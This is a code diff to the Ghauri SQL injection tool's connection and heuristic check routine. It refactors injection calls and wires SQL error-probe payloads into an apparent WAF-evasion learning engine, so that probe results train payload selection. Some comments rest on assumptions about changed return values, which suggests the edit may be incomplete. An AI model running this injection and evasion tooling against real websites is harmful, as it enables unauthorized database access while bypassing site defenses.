@@ -66,6 +66,8 @@ from ghauri.common.utils import (
     Struct,
     clean_dups,
 )
+from ghauri.evasion import learn_from_response
+from ghauri.ghauri import quantum_evasion_engine
 
 
 def basic_check(
@@ -99,9 +101,11 @@ def basic_check(
         ],
     )
     _possible_dbms = None
+    current_context_vector_connect = {"type": "sql_heuristic_connect", "target_waf": "unknown"}
     try:
         logger.notice("testing connection to the target URL")
-        base = inject_expression(
+        # Assuming inject_expression now returns (response, expression_sent)
+        base_response_obj, _ = inject_expression( # _ to ignore expression_sent for connection tests
             url=url,
             data=data,
             proxy=proxy,
@@ -109,6 +113,7 @@ def basic_check(
             parameter=parameter,
             connection_test=True,
         )
+        base = base_response_obj # Keep original variable name for subsequent logic
         retval = session.fetchall(
             session_filepath=conf.session_filepath,
             query="SELECT * FROM tbl_payload WHERE `endpoint`=?",
@@ -132,7 +137,8 @@ def basic_check(
                 time.sleep(0.5)
             except:
                 pass
-            resp = inject_expression(
+            # Assuming inject_expression now returns (response, expression_sent)
+            resp_response_obj, _ = inject_expression( # _ to ignore expression_sent for connection tests
                 url=url,
                 data=data,
                 proxy=proxy,
@@ -140,6 +146,7 @@ def basic_check(
                 parameter=parameter,
                 connection_test=True,
             )
+            resp = resp_response_obj # Keep original variable name
             logger.debug(f"r1: {base.content_length}, r2: {resp.content_length}")
             # check when content length for two similar request differs it mean there could be a false positive boolean based injection detection
             # based on content length of a page so to avoid that content these two initial request should match the content length
@@ -173,19 +180,35 @@ def basic_check(
         else:
             param_name = f"{mc}{param_name}{nc}"
         expressions = ["'\",..))", "',..))", '",..))', "'\"", "%27%22"]
-        for expression in expressions:
-            attack = inject_expression(
+        current_context_vector_probe = {"type": "sql_heuristic_error_probe", "target_waf": "unknown"}
+        for payload_probe_template in expressions: # Renamed for clarity
+            # Assuming inject_expression now returns (response, expression_sent)
+            attack_response_obj, expression_sent = inject_expression(
                 url=url,
                 data=data,
                 proxy=proxy,
                 headers=headers,
                 parameter=parameter,
-                expression=expression,
+                expression=payload_probe_template, # Pass the probe template
                 is_multipart=is_multipart,
                 injection_type=injection_type,
             )
-            html = attack.filtered_text
-            retval = search_possible_dbms_errors(html=attack.text)
+            attack = attack_response_obj # Keep original variable name
+
+            # Determine success for learning: if a DBMS error was found
+            dbms_error_found = bool(search_possible_dbms_errors(html=attack.text).possible_dbms)
+            
+            if expression_sent: # Only learn if an actual payload was sent (not None)
+                learn_from_response(
+                    payload_string=expression_sent,
+                    response_status=attack.status_code,
+                    context_vector=current_context_vector_probe,
+                    success=dbms_error_found, 
+                    engine_instance=quantum_evasion_engine
+                )
+
+            html = attack.filtered_text # Original logic continues
+            retval = search_possible_dbms_errors(html=attack.text) # Already effectively called for dbms_error_found
             if retval.possible_dbms:
                 if attack.status_code in [302, 301, 303, 307]:
                     logger.debug(
